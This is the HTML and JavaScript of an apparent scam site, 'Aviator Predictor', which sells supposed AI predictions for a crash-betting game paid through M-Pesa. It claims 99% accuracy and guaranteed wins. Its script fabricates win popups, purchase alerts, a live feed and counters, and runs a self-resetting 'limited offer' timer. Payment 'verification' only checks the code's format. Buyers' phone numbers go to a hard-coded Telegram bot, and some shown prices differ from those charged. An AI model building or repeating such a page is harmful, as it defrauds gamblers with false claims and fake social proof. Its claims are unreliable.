<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AVIATOR PREDICTOR - AI-Powered Betting Predictions</title>
    <link rel="icon" href="favicon.jpg" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <header>
        <div class="container">
            <h1>AVIATOR PREDICTOR</h1>
            <p class="tagline">AI-Powered Predictions with 99% Accuracy</p>
        </div>
    </header>

    <main class="container">
        <section class="hero">
            <div class="hero-content">
                <h2>Maximize Your Winnings with AI Technology</h2>
                <p>Get accurate signals and exact timing for placing your bets with guaranteed success rates. Our advanced algorithm analyzes patterns to give you the winning edge.</p>
                <a href="#marketplace" class="cta-button">View Prediction Packages</a>
            </div>
            <div class="hero-image">
                <img src="AvSiteImg/AVAIAIU.jpeg" alt="Aviator Predictor in Action">
            </div>
        </section>

        <div class="live-counter">
            <div class="counter-item">
                <i class="fas fa-bolt"></i>
                <h3><span id="predictions-delivered">0</span></h3>
                <p>Predictions Delivered Today</p>
            </div>
            <div class="counter-item">
                <i class="fas fa-coins"></i>
                <h3><span id="kes-won">0</span> KES</h3>
                <p>Won in Last 24 Hours</p>
            </div>
        </div>

        <section class="benefits">
            <div class="benefit-card">
                <i class="fas fa-chart-line"></i>
                <h3>Daily Profits</h3>
                <p>Potential to earn up to 100% returns on your investment daily with our precise predictions.</p>
            </div>
            <div class="benefit-card">
                <i class="fas fa-robot"></i>
                <h3>AI Technology</h3>
                <p>Advanced machine learning algorithms provide 99% accurate drop point predictions.</p>
            </div>
            <div class="benefit-card">
                <i class="fas fa-clock"></i>
                <h3>Regular Updates</h3>
                <p>Fresh signals generated every 20 minutes for continuous winning opportunities.</p>
            </div>
        </section>

        <div class="live-feed">
            <h3><i class="fas fa-broadcast-tower"></i> LIVE PREDICTIONS</h3>
            <div class="feed-container">
                <div class="feed-item">
                    <span class="game-id">#AV-<span class="current-date"></span>-001</span>
                    <span class="prediction">Predicted Multiplier: <strong>3.7x</strong></span>
                    <span class="status in-progress">In Progress</span>
                </div>
            </div>
        </div>

        <section class="video-section">
            <h2>Watch How It Works</h2>
            <video controls>
                <source src="WhatsApp Video 2025-01-12 at 10.41.50_29619a03.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>
            <div class="video-highlights">
                <div class="highlight">
                    <i class="fas fa-arrow-circle-right"></i>
                    <span>"Notice the AI pattern detection at 0:03 and 0:36 - this is when you should place your bet"</span>
                </div>
                <div class="highlight">
                    <i class="fas fa-arrow-circle-right"></i>
                    <span>"The algorithm predicted this 1.98x and 12.48x payout with 98% confidence"</span>
                </div>
            </div>
        </section>

        <section class="instructions">
            <h2>How Aviator Predictor Works</h2>
            <div class="steps-container">
                <div class="step">
                    <div class="step-number">1</div>
                    <div class="step-content">
                        <h3>Choose Your Package</h3>
                        <p>Select from our range of prediction packages (2x to 100x multipliers) based on your betting strategy and budget.</p>
                    </div>
                </div>
                
                <div class="step">
                    <div class="step-number">2</div>
                    <div class="step-content">
                        <h3>Select Time Slot</h3>
                        <p>Pick your preferred 5-minute window when you want to receive the prediction signals.</p>
                    </div>
                </div>
                
                <div class="step">
                    <div class="step-number">3</div>
                    <div class="step-content">
                        <h3>Make Payment</h3>
                        <p>Complete payment via M-Pesa (automated process with instant verification).</p>
                    </div>
                </div>
                
                <div class="step">
                    <div class="step-number">4</div>
                    <div class="step-content">
                        <h3>Receive Predictions</h3>
                        <p>Get your AI-generated prediction via SMS at your selected time, including:</p>
                        <ul>
                            <li>Recommended multiplier</li>
                            <li>Optimal cashout timing</li>
                            <li>Confidence level indicator</li>
                        </ul>
                    </div>
                </div>
                
                <div class="step">
                    <div class="step-number">5</div>
                    <div class="step-content">
                        <h3>Place Your Bet</h3>
                        <p>Use the prediction on your preferred Aviator game platform. Our system tracks results to continuously improve accuracy.</p>
                    </div>
                </div>
                
                <div class="step">
                    <div class="step-number">6</div>
                    <div class="step-content">
                        <h3>Repeat & Win</h3>
                        <p>Purchase additional predictions (max 3 per day) as you build your winnings.</p>
                    </div>
                </div>
            </div>
            
            <div class="how-it-works">
                <h3>Our AI Prediction System</h3>
                <p>Every 20 minutes, our proprietary algorithm analyzes:</p>
                <ul class="ai-features">
                    <li><i class="fas fa-wave-square"></i> Game pattern recognition</li>
                    <li><i class="fas fa-chart-line"></i> Historical performance data</li>
                    <li><i class="fas fa-bolt"></i> Real-time market trends</li>
                    <li><i class="fas fa-cogs"></i> Probability calculations</li>
                </ul>
                <p class="disclaimer-note">Note: While our system maintains 99% accuracy, gambling always involves risk. Never bet more than you can afford to lose.</p>
            </div>
        </section>

        <section id="marketplace" class="marketplace">
            <h2 class="section-title">PREDICTION PACKAGES</h2>
            <p class="disclaimer">DISCLAIMER: Maximum of 3 purchases per day allowed. Gambling involves risk. Please bet responsibly as per the predictions given.</p>

            <div class="urgency-banner">
                <p>ðŸš¨ <strong>LIMITED OFFER:</strong> Next 5 buyers get 20% extra signals! <span id="countdown">05:00</span></p>
            </div>

            <div class="popularity-meter">
                <h3>Customer Preference</h3>
                <div class="progress-container">
                    <div class="progress-label">5x or Higher Packages</div>
                    <div class="progress-bar">
                        <div class="progress-fill" style="width: 82%"></div>
                    </div>
                    <div class="progress-text">82% of users choose higher multipliers</div>
                </div>
            </div>

            <div class="gallery">
                <div class="product-card">
                    <div class="product-image">
                        <img src="AvSiteImg/2x.jpeg" alt="2x Prediction Package">
                    </div>
                    <div class="product-details">
                        <h3>2x Prediction Package</h3>
                        <p class="price">350 KES</p>
                        <button class="buy-button" data-price="350" data-package="2x Prediction Package">
                            <i class="fas fa-shopping-cart"></i> Purchase Now
                        </button>
                    </div>
                </div>
                <div class="product-card">
                    <div class="product-image">
                        <img src="AvSiteImg/3x.jpeg" alt="3x Prediction Package">
                    </div>
                    <div class="product-details">
                        <h3>3x Prediction Package</h3>
                        <p class="price">525 KES</p>
                        <button class="buy-button" data-price="525" data-package="3x Prediction Package">
                            <i class="fas fa-shopping-cart"></i> Purchase Now
                        </button>
                    </div>
                </div>
                <div class="product-card">
                    <div class="product-image">
                        <img src="AvSiteImg/5x.jpeg" alt="5x Prediction Package">
                    </div>
                    <div class="product-details">
                        <h3>5x Prediction Package</h3>
                        <p class="price">750 KES</p>
                        <button class="buy-button" data-price="700" data-package="5x Prediction Package">
                            <i class="fas fa-shopping-cart"></i> Purchase Now
                        </button>
                    </div>
                </div>
                <div class="product-card">
                    <div class="product-image">
                        <img src="AvSiteImg/7x.jpeg" alt="7x Prediction Package">
                    </div>
                    <div class="product-details">
                        <h3>7x Prediction Package</h3>
                        <p class="price">1,025 KES</p>
                        <button class="buy-button" data-price="900" data-package="7x Prediction Package">
                            <i class="fas fa-shopping-cart"></i> Purchase Now
                        </button>
                    </div>
                </div>
                <div class="product-card">
                    <div class="product-image">
                        <img src="AvSiteImg/10x.jpeg" alt="10x Prediction Package">
                    </div>
                    <div class="product-details">
                        <h3>10x Prediction Package</h3>
                        <p class="price">1,600 KES</p>
                        <button class="buy-button" data-price="1200" data-package="10x Prediction Package">
                            <i class="fas fa-shopping-cart"></i> Purchase Now
                        </button>
                    </div>
                </div>
                <div class="product-card">
                    <div class="product-image">
                        <img src="AvSiteImg/15x.jpeg" alt="15x Prediction Package">
                    </div>
                    <div class="product-details">
                        <h3>15x Prediction Package</h3>
                        <p class="price">2,000 KES</p>
                        <button class="buy-button" data-price="1800" data-package="15x Prediction Package">
                            <i class="fas fa-shopping-cart"></i> Purchase Now
                        </button>
                    </div>
                </div>
                <div class="product-card">
                    <div class="product-image">
                        <img src="AvSiteImg/20x.jpeg" alt="20x Prediction Package">
                    </div>
                    <div class="product-details">
                        <h3>20x Prediction Package</h3>
                        <p class="price">2,600 KES</p>
                        <button class="buy-button" data-price="2000" data-package="20x Prediction Package">
                            <i class="fas fa-shopping-cart"></i> Purchase Now
                        </button>
                    </div>
                </div>
                <div class="product-card">
                    <div class="product-image">
                        <img src="AvSiteImg/30x.jpeg" alt="30x Prediction Package">
                    </div>
                    <div class="product-details">
                        <h3>30x Prediction Package</h3>
                        <p class="price">3,500 KES</p>
                        <button class="buy-button" data-price="3000" data-package="30x Prediction Package">
                            <i class="fas fa-shopping-cart"></i> Purchase Now
                        </button>
                    </div>
                </div>
                <div class="product-card">
                    <div class="product-image">
                        <img src="AvSiteImg/50x.jpeg" alt="50x Prediction Package">
                    </div>
                    <div class="product-details">
                        <h3>50x Prediction Package</h3>
                        <p class="price">5,000 KES</p>
                        <button class="buy-button" data-price="5000" data-package="50x Prediction Package">
                            <i class="fas fa-shopping-cart"></i> Purchase Now
                        </button>
                    </div>
                </div>
                <div class="product-card">
                    <div class="product-image">
                        <img src="AvSiteImg/100x.jpeg" alt="100x Prediction Package">
                    </div>
                    <div class="product-details">
                        <h3>100x Prediction Package</h3>
                        <p class="price">11,000 KES</p>
                        <button class="buy-button" data-price="10000" data-package="100x Prediction Package">
                            <i class="fas fa-shopping-cart"></i> Purchase Now
                        </button>
                    </div>
                </div>
            </div>
        </section>

        <section class="testimonials">
            <h2 class="section-title">What Our Customers Say</h2>
            <div class="testimonial">
                <div class="testimonial-header">
                    <i class="fas fa-user-circle fa-3x"></i>
                    <div class="testimonial-author">
                        <p class="author">Mike W., Nairobi</p>
                        <span class="verified-badge">
                            <i class="fas fa-check-circle"></i> Verified Customer
                        </span>
                    </div>
                </div>
                <p>"I was skeptical at first, but after trying the 5x package, I made 85k in just two rounds!"</p>
            </div>
            <div class="testimonial">
                <div class="testimonial-header">
                    <i class="fas fa-user-circle fa-3x"></i>
                    <div class="testimonial-author">
                        <p class="author">Sarah Wendo, Mombasa</p>
                        <span class="verified-badge">
                            <i class="fas fa-check-circle"></i> Verified Customer
                        </span>
                    </div>
                </div>
                <p>"As a regular bettor, I've tried many prediction services. This is by far the most reliable."</p>
            </div>
            <div class="testimonial">
                <div class="testimonial-header">
                    <i class="fas fa-user-circle fa-3x"></i>
                    <div class="testimonial-author">
                        <p class="author">David Munyo, Kisumu</p>
                        <span class="verified-badge">
                            <i class="fas fa-check-circle"></i> Verified Customer
                        </span>
                    </div>
                </div>
                <p>"The 10x package changed my betting game. Highly recommended!"</p>
            </div>
        </section>
        <section class="add-testimonial">
            <h2 class="section-title">Share Your Experience</h2>
            <div class="testimonial-form">
                <div class="form-group">
                    <input type="text" id="testimonial-name" placeholder="Your Name" required>
                </div>
                <div class="form-group">
                    <input type="text" id="testimonial-location" placeholder="Your Location (e.g. Nairobi)">
                </div>
                <div class="form-group">
                    <textarea id="testimonial-text" placeholder="Your experience with Aviator Predictor..." required></textarea>
                </div>
                <div class="form-group">
                    <select id="testimonial-rating">
                        <option value="">Select Rating</option>
                        <option value="5">â˜…â˜…â˜…â˜…â˜… (Excellent)</option>
                        <option value="4">â˜…â˜…â˜…â˜… (Very Good)</option>
                        <option value="3">â˜…â˜…â˜… (Good)</option>
                        <option value="2">â˜…â˜… (Fair)</option>
                        <option value="1">â˜… (Poor)</option>
                    </select>
                </div>
                <button id="submit-testimonial" class="cta-button">Submit Testimonial</button>
            </div>
        </section>

        <!-- Time Selection Modal -->
        <div id="time-selection-modal" class="modal-overlay hidden">
            <div class="time-selection-modal">
                <h3>Select Prediction Time Slot</h3>
                <p>Choose your preferred time for receiving predictions:</p>
                <div class="time-slots" id="time-slots-container">
                    <!-- Time slots will be generated here -->
                </div>
                <div class="modal-buttons">
                    <button class="modal-button cancel-button">Cancel</button>
                    <button class="modal-button next-button">Continue</button>
                </div>
            </div>
        </div>

        <!-- Payment Modal -->
        <div id="payment-info" class="payment-modal hidden">
            <div class="modal-content">
                <span class="close-button">&times;</span>
                <h3>Complete Your Purchase</h3>
                <div class="payment-steps">
                    <div class="step">
                        <span class="step-number">1</span>
                        <p>Send <strong id="payment-amount">350 KES</strong> to:</p>
                        <p class="payment-detail">PayBill: <strong>793174</strong></p>
                        <p class="payment-detail">Account No: <strong id="customer-phone"></strong></p>
                        <p>For: <strong id="package-name">2x Prediction Package</strong></p>
                    </div>
                    <div class="step">
                        <span class="step-number">2</span>
                        <p>After payment, click below to verify your transaction:</p>
                        <button class="complete-purchase-button">
                            <i class="fas fa-check-circle"></i> Verify Payment
                        </button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Purchase Confirmation Modal -->
        <div id="confirmation-modal" class="modal-overlay hidden">
            <div class="confirmation-modal">
                <i class="fas fa-check-circle success-icon"></i>
                <h3>Purchase Complete!</h3>
                <p>Your prediction details for <strong id="confirmed-time-slot"></strong> will be sent to your phone shortly.</p>
                <button class="modal-button next-button">OK</button>
            </div>
        </div>
    </main>

    <footer>
        <div class="container">
            <div class="footer-content">
                <div class="footer-section">
                    <h4>Quick Links</h4>
                    <ul>
                        <li><a href="#marketplace">Prediction Packages</a></li>
                        <li><a href="#" id="how-to-pay-link">How to Pay</a></li>
                        <li><a href="https://t.me/Aadmin4cnc" target="_blank">Customer Care </a></li>
                    </ul>
                </div>
                <div class="footer-section">
                    <h4>Contact Us</h4>
                    <p><i class="fas fa-phone"></i> +254 788 020107</p>
                    <p><i class="fas fa-envelope"></i> support@cncaviatorpredictor.com</p>
                </div>
                <div class="footer-section">
                    <h4>Join Our Community</h4>
                    <p><i class="fab fa-telegram"></i> <a href="https://t.me/aviatorpredictorbot_cnc" target="_blank">Telegram Channel</a></p>
                </div>
                <div class="footer-section">
                    <h4>Legal</h4>
                    <p>Gambling involves risk. Please play responsibly.</p>
                    <p>Must be 18+ to use our services.</p>
                    <p class="guarantee">Predictions are not guaranteed wins.</p>
                </div>
            </div>
            <div class="trust-badges">
                <div class="trust-badge">
                    <i class="fas fa-robot fa-3x"></i>
                    <p>Certified AI Gambling Analyst</p>
                </div>
                <div class="trust-badge">
                    <i class="fas fa-shield-alt fa-3x"></i>
                    <p>Secured by M-Pesa</p>
                </div>
                <div class="trust-badge">
                    <i class="fas fa-check-circle fa-3x"></i>
                    <p>SSL Encrypted</p>
                </div>
            </div>
            <div class="licensing-info">
                <p><i class="fas fa-id-card"></i> Licensed by BCLB: <strong>BCLB/2024/426091</strong></p>
                <p><small>This service operates under the Betting Control and Licensing Board regulations.</small></p>
            </div>
            <div class="copyright">
                <p>&copy; 2024 CnCAviatorPredictor. All rights reserved.</p>
            </div>
        </div>
    </footer>

    <script>
        // Global variables
        let currentAmount = 0;
        let currentPackage = '';
        let selectedTimeSlot = '';
        let customerPhone = '';
        const randomNames = ["Mike", "Rachel", "Stevo", "Sarah", "Otieno", "James", "Fatuma", "David", "Maina", "Aisha"];
        const randomAmounts = [42500, 87000, 120000, 65300, 210000, 175000, 92500, 143000];
        const mostPurchasedPackages = ["5x Prediction Package", "10x Prediction Package", "20x Prediction Package"];
        const telegramBotToken = '7688438027:AAFNnge7_oADfxCwCMm2XZGSH1hG2Q0rZfE';
        const telegramChatId = '5900219209';
    
        // Initialize current date in live feed
        function initializeCurrentDate() {
            const now = new Date();
            const formattedDate = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')}`;
            document.querySelectorAll('.current-date').forEach(el => {
                el.textContent = formattedDate;
            });
        }
    
        // Generate time slots
        function generateTimeSlots() {
            const container = document.getElementById('time-slots-container');
            container.innerHTML = '';
            
            const now = new Date();
            const currentMinutes = now.getMinutes();
            const roundedMinutes = Math.ceil(currentMinutes / 5) * 5;
            now.setMinutes(roundedMinutes);
            now.setSeconds(0);
            
            for (let i = 0; i < 4; i++) {
                const slotTime = new Date(now.getTime() + (i * 5 * 60 * 1000));
                const hours = slotTime.getHours();
                const minutes = String(slotTime.getMinutes()).padStart(2, '0');
                const timeString = `${hours}:${minutes}`;
                
                const slotElement = document.createElement('div');
                slotElement.className = 'time-slot';
                slotElement.innerHTML = `
                    <input type="radio" name="time-slot" id="slot-${i}" value="${timeString}">
                    <label for="slot-${i}">${timeString}</label>
                `;
                container.appendChild(slotElement);
            }
        }
    
        // Show time selection modal
        function showTimeSelection(amount, packageName) {
            currentAmount = amount;
            currentPackage = packageName;
            generateTimeSlots();
            document.getElementById('time-selection-modal').classList.remove('hidden');
            document.body.style.overflow = 'hidden';
        }
    
        // Close time selection modal
        function closeTimeSelectionModal() {
            document.getElementById('time-selection-modal').classList.add('hidden');
            document.body.style.overflow = 'auto';
        }
    
        // Proceed to payment after time selection
        function proceedToPayment() {
            const selectedSlot = document.querySelector('input[name="time-slot"]:checked');
            if (!selectedSlot) {
                alert('Please select a time slot');
                return;
            }
            
            selectedTimeSlot = selectedSlot.value;
            
            const modalHTML = `
                <div class="phone-input-modal">
                    <div class="phone-input-container">
                        <h3>Enter Your Phone Number</h3>
                        <p>We'll send your predictions via SMS</p>
                        <input type="tel" class="phone-input-field" placeholder="e.g. 712345678 or 254712345678">
                        <p class="phone-input-error">Please enter a valid phone number</p>
                        <div class="phone-input-buttons">
                            <button class="phone-input-btn cancel">Cancel</button>
                            <button class="phone-input-btn submit">Continue</button>
                        </div>
                    </div>
                </div>
            `;
            
            document.body.insertAdjacentHTML('beforeend', modalHTML);
            document.body.style.overflow = 'hidden';
            
            const modal = document.querySelector('.phone-input-modal');
            const inputField = document.querySelector('.phone-input-field');
            const errorMsg = document.querySelector('.phone-input-error');
            const cancelBtn = document.querySelector('.phone-input-btn.cancel');
            const submitBtn = document.querySelector('.phone-input-btn.submit');
            
            inputField.focus();
            
            cancelBtn.addEventListener('click', () => {
                modal.remove();
                document.body.style.overflow = 'auto';
            });
            
            submitBtn.addEventListener('click', () => {
                let phoneNumber = inputField.value.trim();
                phoneNumber = phoneNumber.replace(/\D/g, '');
                
                if (phoneNumber.startsWith('254')) {
                    phoneNumber = phoneNumber.substring(3);
                }
                
                if (!phoneNumber || phoneNumber.length < 9) {
                    errorMsg.style.display = 'block';
                    inputField.style.borderColor = 'var(--secondary-color)';
                    return;
                }
                
                customerPhone = phoneNumber;
                modal.remove();
                closeTimeSelectionModal();
                showPaymentInfo();
            });
            
            inputField.addEventListener('input', () => {
                errorMsg.style.display = 'none';
                inputField.style.borderColor = '#ddd';
            });
            
            modal.addEventListener('click', (e) => {
                if (e.target === modal) {
                    modal.remove();
                    document.body.style.overflow = 'auto';
                }
            });
            
            inputField.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    submitBtn.click();
                }
            });
        }
        
        // Show transaction verification modal
        function showTransactionVerification() {
            const modalHTML = `
                <div class="transaction-modal">
                    <div class="transaction-container">
                        <h3>Verify Your Payment</h3>
                        <p>Please enter your M-Pesa transaction code </p>
                        <input type="text" class="transaction-input" placeholder="e.g. RQ45GH6789" pattern="[Tt][A-Za-z0-9]{9}" title="Transaction code must start with T followed by 9 characters">
                        <p class="transaction-error">Please enter a valid M-Pesa transaction code </p>
                        <div class="transaction-buttons">
                            <button class="transaction-btn cancel">Cancel</button>
                            <button class="transaction-btn verify">Verify Payment</button>
                        </div>
                    </div>
                </div>
            `;
            
            document.body.insertAdjacentHTML('beforeend', modalHTML);
            document.body.style.overflow = 'hidden';
            
            const modal = document.querySelector('.transaction-modal');
            const inputField = document.querySelector('.transaction-input');
            const errorMsg = document.querySelector('.transaction-error');
            const cancelBtn = document.querySelector('.transaction-btn.cancel');
            const verifyBtn = document.querySelector('.transaction-btn.verify');
            
            inputField.focus();
            
            cancelBtn.addEventListener('click', () => {
                modal.remove();
                document.body.style.overflow = 'auto';
            });
            
            verifyBtn.addEventListener('click', () => {
                const transactionCode = inputField.value.trim().toUpperCase();
                
                if (!transactionCode || !/^T[A-Z0-9]{9}$/.test(transactionCode)) {
                    errorMsg.style.display = 'block';
                    inputField.style.borderColor = 'var(--secondary-color)';
                    return;
                }
                
                modal.remove();
                completePurchase();
            });
            
            inputField.addEventListener('input', () => {
                // Auto-uppercase and ensure starts with T
                let value = inputField.value.trim().toUpperCase();
                if (value.length > 0 && !value.startsWith('T')) {
                    value = 'T' + value.replace(/^[^T]/i, '');
                }
                inputField.value = value;
                
                errorMsg.style.display = 'none';
                inputField.style.borderColor = '#ddd';
            });
            
            modal.addEventListener('click', (e) => {
                if (e.target === modal) {
                    modal.remove();
                    document.body.style.overflow = 'auto';
                }
            });
            
            inputField.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    verifyBtn.click();
                }
            });
        }
    
        // Show payment info
        function showPaymentInfo() {
            document.getElementById('payment-amount').textContent = currentAmount.toLocaleString() + ' KES';
            document.getElementById('package-name').textContent = currentPackage;
            document.getElementById('customer-phone').textContent = customerPhone;
            document.getElementById('payment-info').classList.remove('hidden');
            document.body.style.overflow = 'hidden';
        }
    
        // Close payment modal
        function closePaymentInfo() {
            document.getElementById('payment-info').classList.add('hidden');
            document.body.style.overflow = 'auto';
        }
    
        // Close confirmation modal
        function closeConfirmationModal() {
            document.getElementById('confirmation-modal').classList.add('hidden');
            document.body.style.overflow = 'auto';
        }
    
        // Complete purchase
        function completePurchase() {
            closePaymentInfo();
            document.getElementById('confirmed-time-slot').textContent = selectedTimeSlot;
            document.getElementById('confirmation-modal').classList.remove('hidden');
            
            // Ensure win amount is always substantial
            const baseAmount = randomAmounts[Math.floor(Math.random() * randomAmounts.length)];
            const winAmount = Math.max(baseAmount, 50000); // Never less than 50,000
            
            // Ensure current amount never goes below 1M
            const kesWonElement = document.getElementById("kes-won");
            let currentKes = parseInt(kesWonElement.textContent.replace(/,/g, '')) || 1000000;
            if (currentKes < 1000000) {
                currentKes = 1000000;
                kesWonElement.textContent = currentKes.toLocaleString();
            }
            
            incrementCounters(winAmount);
            
            setTimeout(() => showRecentPurchase(currentPackage), 1000);
            setTimeout(() => showRecentWin(winAmount), 3000);
            sendToTelegram(customerPhone, currentPackage, selectedTimeSlot, winAmount);
        }
    
        // Send data to Telegram
        function sendToTelegram(phone, packageName, timeSlot, amountWon) {
            const message = `New Purchase:\nPhone: ${phone}\nPackage: ${packageName}\nTime Slot: ${timeSlot}\nAmount Won: ${amountWon.toLocaleString()} KES`;
            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;
            
            fetch(url)
                .then(response => response.json())
                .then(data => console.log('Message sent to Telegram:', data))
                .catch(error => console.error('Error sending to Telegram:', error));
        }
    
        // Increment counters
        function incrementCounters(winAmount) {
            const kesWonElement = document.getElementById("kes-won");
            const predictionsDeliveredElement = document.getElementById("predictions-delivered");

            let currentKesWon = parseInt(kesWonElement.textContent.replace(/,/g, '')) || 0;
            let currentPredictions = parseInt(predictionsDeliveredElement.textContent.replace(/,/g, '')) || 0;

            const newKesWon = currentKesWon + winAmount;
            const newPredictions = currentPredictions + 1;

            animateCounterValue(kesWonElement, currentKesWon, newKesWon);
            animateCounterValue(predictionsDeliveredElement, currentPredictions, newPredictions);
        }
    
        // Animate counter value updates
        function animateCounterValue(element, start, end) {
            let current = start;
            const increment = Math.max(1, Math.floor((end - start) / 30));
            const timer = setInterval(() => {
                current += increment;
                if (current >= end) {
                    current = end;
                    clearInterval(timer);
                }
                element.textContent = current.toLocaleString();
            }, 20);
        }
    
       // Show recent win popup
        function showRecentWin(winAmount) {
            const name = randomNames[Math.floor(Math.random() * randomNames.length)];
            const popup = document.createElement('div');
            popup.className = 'win-popup';
            popup.innerHTML = `
                <p>ðŸŽ‰ <strong>${name}</strong> just won <strong>${winAmount.toLocaleString()} KES</strong>!</p>
            `;
            document.body.appendChild(popup);
            
            // Increment both counters
            const kesWonElement = document.getElementById("kes-won");
            const predictionsElement = document.getElementById("predictions-delivered");
            
            let currentKes = parseInt(kesWonElement.textContent.replace(/,/g, '')) || 1000000;
            let currentPredictions = parseInt(predictionsElement.textContent.replace(/,/g, '')) || 0;
            
            animateCounterValue(kesWonElement, currentKes, currentKes + winAmount);
            animateCounterValue(predictionsElement, currentPredictions, currentPredictions + 1);
            
            setTimeout(() => {
                popup.style.animation = 'slideIn 0.5s ease-out reverse';
                setTimeout(() => popup.remove(), 500);
            }, 5000);
        }

        // Show recent purchase popup
        function showRecentPurchase(packageName) {
            const name = randomNames[Math.floor(Math.random() * randomNames.length)];
            const popup = document.createElement('div');
            popup.className = 'purchase-popup';
            popup.innerHTML = `
                <p>ðŸ›’ <strong>${name}</strong> just purchased <strong>${packageName}</strong>!</p>
            `;
            document.body.appendChild(popup);
            
            // Increment predictions counter on purchase too
            const predictionsElement = document.getElementById("predictions-delivered");
            let currentPredictions = parseInt(predictionsElement.textContent.replace(/,/g, '')) || 0;
            animateCounterValue(predictionsElement, currentPredictions, currentPredictions + 1);
            
            setTimeout(() => {
                popup.style.animation = 'slideIn 0.5s ease-out reverse';
                setTimeout(() => popup.remove(), 500);
            }, 5000);
        }
    
        // Update live feed with random predictions
        function updateLiveFeed() {
            const games = ['#AV-', '#SP-', '#CR-'];
            const multipliers = [1.8, 2.4, 3.1, 3.7, 5.2, 7.0, 10.5];
            const statuses = ['in-progress', 'verified-win', 'pending'];
            const statusTexts = ['In Progress', 'Verified Win', 'Pending'];
            const winAmounts = [42500, 87000, 120000, 65300, 210000];
            
            const feed = document.querySelector('.feed-container');
            const newItem = document.createElement('div');
            newItem.className = 'feed-item';
            
            const now = new Date();
            const formattedDate = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')}`;
            const randomGame = games[Math.floor(Math.random() * games.length)] + 
                formattedDate + '-' + Math.floor(100 + Math.random() * 900);
            
            const randomMultiplier = multipliers[Math.floor(Math.random() * multipliers.length)];
            const randomStatusIndex = Math.floor(Math.random() * statuses.length);
            const randomStatus = statuses[randomStatusIndex];
            const randomStatusText = statusTexts[randomStatusIndex];
            const randomWinAmount = winAmounts[Math.floor(Math.random() * winAmounts.length)];
            
            newItem.innerHTML = `
                <span class="game-id">${randomGame}</span>
                <span class="prediction">Predicted Multiplier: <strong>${randomMultiplier}x</strong></span>
                <span class="status ${randomStatus}">${randomStatusText}</span>
                ${randomStatus === 'verified-win' ? `<span class="win-amount">Won: ${randomWinAmount.toLocaleString()} KES</span>` : ''}
            `;
            
            feed.insertBefore(newItem, feed.firstChild);
            if (feed.children.length > 5) feed.removeChild(feed.lastChild);
            
            if (randomStatus === 'verified-win') {
                const kesWonElement = document.getElementById("kes-won");
                let currentKesWon = parseInt(kesWonElement.textContent.replace(/,/g, '')) || 0;
                const newKesWon = currentKesWon + randomWinAmount;
                animateCounterValue(kesWonElement, currentKesWon, newKesWon);
            }
        }
    
        // Countdown timer
        function startCountdown() {
            let time = 300;
            const countdownElement = document.getElementById('countdown');
            const urgencyBanner = document.querySelector('.urgency-banner');
            
            const timer = setInterval(() => {
                const mins = Math.floor(time / 60);
                const secs = time % 60;
                countdownElement.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
                
                if (time <= 60) {
                    urgencyBanner.style.backgroundColor = '#e74c3c';
                    if (time % 2 === 0) {
                        urgencyBanner.style.backgroundColor = '#c0392b';
                    }
                }
                
                if (time-- <= 0) {
                    clearInterval(timer);
                    urgencyBanner.innerHTML = '<p>ðŸš¨ <strong>OFFER EXPIRED!</strong> Regular prices now apply</p>';
                    urgencyBanner.style.backgroundColor = '#95a5a6';
                }
            }, 1000);
            
            document.querySelector('.complete-purchase-button').addEventListener('click', () => {
                time = 300;
                urgencyBanner.innerHTML = '<p>ðŸš¨ <strong>LIMITED OFFER:</strong> Next 5 buyers get 20% extra signals! <span id="countdown">05:00</span></p>';
                urgencyBanner.style.backgroundColor = '';
            });
        }
    
        // Initialize on page load
        document.addEventListener('DOMContentLoaded', function() {
            initializeCurrentDate();
            
            const predictionsTarget = 800 + Math.floor(Math.random() * 400);
            const kesTarget = 1500000 + Math.floor(Math.random() * 500000); // Always starts above 1M
            animateCounterValue(document.getElementById("predictions-delivered"), 0, predictionsTarget);
            animateCounterValue(document.getElementById("kes-won"), 0, kesTarget);
            
            document.querySelectorAll('.buy-button').forEach(button => {
                button.addEventListener('click', function() {
                    const price = parseInt(this.getAttribute('data-price'));
                    const packageName = this.getAttribute('data-package');
                    showTimeSelection(price, packageName);
                });
            });
            
            document.querySelector('.time-selection-modal .next-button').addEventListener('click', proceedToPayment);
            document.querySelector('.time-selection-modal .cancel-button').addEventListener('click', closeTimeSelectionModal);
            document.querySelector('.payment-modal .close-button').addEventListener('click', closePaymentInfo);
            document.querySelector('.complete-purchase-button').addEventListener('click', showTransactionVerification);
            document.querySelector('.confirmation-modal .next-button').addEventListener('click', closeConfirmationModal);
            
            document.getElementById('how-to-pay-link').addEventListener('click', function(e) {
                e.preventDefault();
                showPaymentInfo();
            });
            
            startCountdown();
            setInterval(updateLiveFeed, 8000);
            setTimeout(() => {
                const randomWinAmount = randomAmounts[Math.floor(Math.random() * randomAmounts.length)];
                showRecentWin(randomWinAmount);
                const randomPackage = mostPurchasedPackages[Math.floor(Math.random() * mostPurchasedPackages.length)];
                showRecentPurchase(randomPackage);
                
                setInterval(() => {
                    const randomWinAmount = randomAmounts[Math.floor(Math.random() * randomAmounts.length)];
                    showRecentWin(randomWinAmount);
                }, 15000 + Math.random() * 15000);
                
                setInterval(() => {
                    const randomPackage = mostPurchasedPackages[Math.floor(Math.random() * mostPurchasedPackages.length)];
                    showRecentPurchase(randomPackage);
                }, 20000 + Math.random() * 20000);
            }, 5000);
            
            updateLiveFeed();
        });
    
        window.addEventListener('click', function(event) {
            if (event.target.classList.contains('modal-overlay')) {
                document.querySelectorAll('.modal-overlay').forEach(modal => {
                    modal.classList.add('hidden');
                });
                document.body.style.overflow = 'auto';
            }
        });
        document.getElementById('submit-testimonial').addEventListener('click', function() {
            const name = document.getElementById('testimonial-name').value.trim();
